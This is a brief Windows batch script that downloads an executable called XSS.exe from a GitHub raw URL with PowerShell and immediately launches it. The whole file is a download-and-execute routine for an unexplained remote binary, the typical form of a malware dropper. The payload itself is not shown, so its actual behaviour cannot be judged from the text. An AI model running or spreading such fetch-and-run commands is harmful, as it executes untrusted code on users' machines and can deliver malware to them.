@echo off
REM Download the executable from the specified link
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Astolfomiaw1/XSS/main/XSS.exe' -OutFile 'XSS.exe'"

REM Check if the download was successful
if exist XSS.exe (
    echo File downloaded successfully.
    REM Run the executable
    start XSS.exe
) else (
    echo Failed to download the file.
    pause
)
